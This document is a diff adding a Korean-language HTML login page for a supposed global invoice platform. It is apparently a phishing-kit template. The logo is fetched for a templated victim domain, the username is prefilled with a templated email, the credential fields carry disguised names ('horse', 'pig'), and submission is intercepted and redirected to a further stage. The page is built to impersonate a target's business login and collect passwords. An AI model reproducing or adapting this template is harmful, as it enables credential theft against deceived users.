@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>국제 비즈니스 로그인 | 믿을 수 있는 글로벌 인보이스 플랫폼</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon"> <!-- Favicon -->
+    <style>
+        :root {
+            --primary-bg-color: rgba(0, 0, 0, 0.7);
+            --accent-color: #FFD700;
+            --hover-accent-color: #FFA500;
+            --input-bg-color: #333;
+            --text-color-light: #fff;
+            --text-color-dark: #ddd;
+            --max-width: 400px;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1489171078254-c3365d6e359f?w=500&auto=format&fit=crop&q=60&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTJ8fE1vZGVybiUyME9mZmljZSUyMEJhY2tncm91bmR8ZW58MHx8MHx8fDA%3D') no-repeat center center/cover;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: var(--text-color-light);
+        }
+
+        .login-container {
+            background-color: var(--primary-bg-color);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: var(--max-width);
+            padding: 30px;
+            text-align: center;
+            box-sizing: border-box;
+            opacity: 0;
+            transform: translateY(-20px);
+            transition: opacity 0.6s ease, transform 0.6s ease;
+        }
+
+        .login-container.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .login-container h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+        }
+
+        .login-container p {
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: var(--text-color-dark);
+        }
+
+        .login-container form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid var(--input-bg-color);
+            border-radius: 5px;
+            font-size: 14px;
+            width: 100%;
+            background-color: var(--input-bg-color);
+            color: var(--text-color-light);
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+
+        .login-container input[type="text"]:focus,
+        .login-container input[type="password"]:focus {
+            border-color: var(--accent-color);
+            outline: none;
+        }
+
+        .login-container input[type="submit"] {
+            padding: 15px;
+            background-color: var(--accent-color);
+            color: #000;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: var(--hover-accent-color);
+        }
+
+        .login-container .forgot-password {
+            margin-top: 10px;
+            font-size: 14px;
+            color: var(--accent-color);
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .login-container .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .login-container .trust-icons {
+            margin-top: 20px;
+            display: flex;
+            justify-content: space-around;
+        }
+
+        .login-container .trust-icons i {
+            font-size: 24px;
+            color: var(--accent-color);
+        }
+
+        .login-container .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .login-container .logo-container img {
+            width: 100px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginContainer">
+        <div class="logo-container">
+            <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Platform Logo">
+        </div>
+        <h1>안전하고 신뢰할 수 있는 로그인</h1>
+        <p>국제 비즈니스를 위한 최고의 글로벌 인보이스 플랫폼에 오신 것을 환영합니다.</p>
+        <form id="loginForm" action="#" method="POST">
+            <input type="text" name="horse" placeholder="아이디" required aria-label="아이디" value="{{eman}}" >
+            <input type="password" name="pig" placeholder="비밀번호" required aria-label="비밀번호">
+            <input type="submit" value="로그인">
+        </form>
+        <a href="#" class="forgot-password">비밀번호를 잊으셨습니까?</a>
+        <div class="trust-icons">
+            <i class="fas fa-shield-alt" aria-label="Security"></i>
+            <i class="fas fa-lock" aria-label="Lock"></i>
+            <i class="fas fa-globe" aria-label="Global"></i>
+        </div>
+    </div>
+    <script>
+        // JavaScript to handle fade-in effect
+        document.addEventListener('DOMContentLoaded', () => {
+            const loginContainer = document.getElementById('loginContainer');
+            loginContainer.classList.add('visible');
+
+            // JavaScript to handle form submission
+            const loginForm = document.getElementById('loginForm');
+            loginForm.addEventListener('submit', (event) => {
+                event.preventDefault(); // Prevent the default form submission
+                window.location.href = 'first'; // Replace with your redirect URL
+            });
+        });
+    </script>
+</body>
+</html>
